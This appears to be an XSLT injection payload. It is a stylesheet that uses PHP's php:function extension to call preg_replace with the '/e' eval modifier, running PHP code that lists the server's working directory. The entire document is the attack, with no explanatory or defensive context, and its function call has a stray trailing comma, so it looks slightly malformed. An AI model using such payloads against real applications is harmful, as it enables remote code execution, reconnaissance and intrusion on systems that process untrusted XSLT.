<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:variable name="scan">
    implode('<br/>', scandir('.'))
</xsl:variable>
<xsl:value-of select="php:function('preg_replace', '/.*/e', $scan, )"/>
</xsl:template>
</xsl:stylesheet>
